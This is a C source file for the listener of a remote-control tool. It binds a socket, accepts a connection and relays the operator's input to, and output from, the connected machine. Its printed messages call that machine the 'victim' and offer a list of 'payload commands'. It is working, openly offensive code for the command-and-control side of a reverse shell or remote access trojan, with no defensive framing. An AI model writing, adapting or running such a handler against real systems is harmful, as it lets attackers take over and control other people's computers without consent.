#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAXBUF 65536
#define BACKLOG 1

// Declaration of struct "args" as the pthread_create function preferably takes a struct as a param
typedef struct args
{
    int src;
    int dest;
} args;

// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
void *Thread(void *arg)
{
    
    args a = *(args *)arg;
    int n;
    char buffer[MAXBUF];

    while ((n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
    {	
        write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
    }

    if (n == -1)
    {
        printf("Error in function thread read()\n");
    }

    return NULL;
}

int CreateServerSocket(char *address, char *port, int *type, int *family)
{
    int sockfd, gai_error;
    struct addrinfo hints, *servinfo, *p;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = *family;   // passes parameters called into a struct
    hints.ai_socktype = *type;
    hints.ai_flags = AI_PASSIVE;

    if ((gai_error = getaddrinfo(address, port, &hints, &servinfo)) != 0)
    {
        fprintf(stderr, "Error in getaddrinfo(): %s\n", gai_strerror(gai_error));
        exit(0);
    }

    for (p = servinfo; p != NULL; p = p->ai_next)
    {
        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);

        if (sockfd == -1)
        {
            perror("Error in socket()");
            continue;
        }

        if (*type == SOCK_STREAM)
        {
            int sockopt = setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));

            if (sockopt == -1)
            {
                printf("Error in function setsockopt\n");
            }
        }
	
	// binds socket
        if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1)
        {
            close(sockfd);
            perror("Error in bind()");
            continue;
        }

        break;
    }

    if (p == NULL)
    {
        printf("Error could not bind\n");
        exit(0);
    }
	
    // starts listening for incoming connections
    if (*type == SOCK_STREAM && listen(sockfd, BACKLOG) == -1)
    {
        printf("Error in function listen\n");
    }

    freeaddrinfo(servinfo);
    printf("Listener started... awaiting connection\n");
    return sockfd;
}


void Server(char *address, char *port, int *type, int *family)
{
    int serverfd, clientfd, n;
    char buffer[MAXBUF];
    pthread_t printer;
    socklen_t len;
    struct sockaddr_storage cli;

    // calls function to create server socket then returns server file descriptor
    serverfd = CreateServerSocket(address, port, type, family);
    len = sizeof cli;
    // uses accept function to accept socket connections, stores connection file descriptor in clientfd
    if (*type == SOCK_STREAM && (clientfd = accept(serverfd, (struct sockaddr *)&cli, &len)) == -1)
    {
        printf("Error in function accept()\n");
    }
    
    // Passes arguments to the thread struct
    args a;
    a.src = STDIN_FILENO;
    a.dest = clientfd;
    
    struct sockaddr_in* pV4Addr = (struct sockaddr_in*)&cli;
    struct in_addr ipAddr = pV4Addr->sin_addr;

    char victim_address[INET_ADDRSTRLEN];
    inet_ntop( AF_INET, &ipAddr, victim_address, INET_ADDRSTRLEN );
    printf("Connection received - starting control session with victim %s\n", victim_address);
    printf("Type \"help\" to see a list of payload commands\n");
    
    // creates thread that will run parallel with the rest of the code
    if (pthread_create(&printer, NULL, Thread, (void *)&a) != 0)
    {
        printf("Error in function pthread_create\n");
    }
    // reads data from the victim socket, executes code is data is found
    while ((n = read(clientfd, buffer, MAXBUF)) > 0)
    {
        if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
        {
            printf("Error in function write()\n");
        }
    }

    if (n == -1)
    {
        printf("Error in function read()\n");
    }
    // sends a request to stop thread
    pthread_cancel(printer);
    pthread_join(printer, NULL);

    close(clientfd);
    close(serverfd);

}


